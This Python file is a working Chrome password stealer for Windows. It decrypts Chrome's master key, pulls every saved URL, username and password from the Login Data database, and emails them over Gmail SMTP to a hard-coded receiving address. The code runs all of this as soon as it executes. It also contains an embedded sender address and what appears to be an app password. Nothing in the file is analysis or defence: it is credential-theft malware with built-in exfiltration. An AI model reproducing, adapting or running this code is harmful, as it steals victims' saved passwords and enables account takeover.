import os
import json
import shutil
import base64
import sqlite3
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
from datetime import datetime, timezone, timedelta
import smtplib
from email.mime.text import MIMEText

class ChromePasswordExtractor:
    def __init__(self):
        self._user_data = os.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data"
        self._master_key = self._get_master_key()

    def _get_master_key(self):
        try:
            if self.get_installed_browsers():
                with open(self._user_data + "\\Local State", "r") as f:
                    local_state = f.read()
                    local_state = json.loads(local_state)
                    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
                    master_key = master_key[5:]
                    master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
                    return master_key
            else:
                return None
        except Exception as e:
            return e

    @staticmethod
    def _decrypt(buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except Exception as e:
            return str(e)

    def passwords(self):
        try:
            login_db = self.get_file_path("Login Data")
            if login_db:
                login_db_copy = os.getenv("TEMP") + "\\Login.db"
                shutil.copy2(login_db, login_db_copy)
                conn = sqlite3.connect(login_db_copy)
                cursor = conn.cursor()
                password_data = ""
                try:
                    cursor.execute(
                        "SELECT action_url, username_value, password_value FROM logins")
                    for item in cursor.fetchall():
                        url = item[0]
                        username = item[1]
                        encrypted_password = item[2]
                        decrypted_password = self._decrypt(
                            encrypted_password, self._master_key)
                        if username or decrypted_password:
                            data = f"URLs: {url}\n"
                            data += f"Username: {username}\n"
                            data += f"Password: {decrypted_password}\n\n"
                            password_data += data
                except sqlite3.Error:
                    pass
                cursor.close()
                conn.close()
                os.remove(login_db_copy)
                return password_data
            else:
                return None
        except Exception as e:
            return f"[!]Error: {e}"

    def get_installed_browsers(self):
        default_dir_paths = [
            "C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe",
            "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"
        ]
        for path in default_dir_paths:
            if os.path.exists(path):
                return True
        return False

    def get_file_path(self, paths):
        for root, dirs, files in os.walk(self._user_data):
            for file in files:
                if file == paths:
                    return os.path.join(root, file)

    def send_email(self, result):
        sender_email = 'gourragui12@gmail.com'
        receiver_email = 'osawagourragui@gmail.com'
        subject = 'Chrome Password Extraction Result'

        msg = MIMEText(result)
        msg['Subject'] = subject
        msg['From'] = sender_email
        msg['To'] = receiver_email

        try:
            with smtplib.SMTP('smtp.gmail.com', 587) as server:
                server.starttls()
                server.login(sender_email, 'vvhg ofez oeuc haui')
                server.sendmail(sender_email, receiver_email, msg.as_string())
            print("Email sent successfully.")
        except Exception as e:
            print(f"Error sending email: {e}")

# Example usage:
chrome_extractor = ChromePasswordExtractor()
password_data = chrome_extractor.passwords()
chrome_extractor.send_email(password_data)
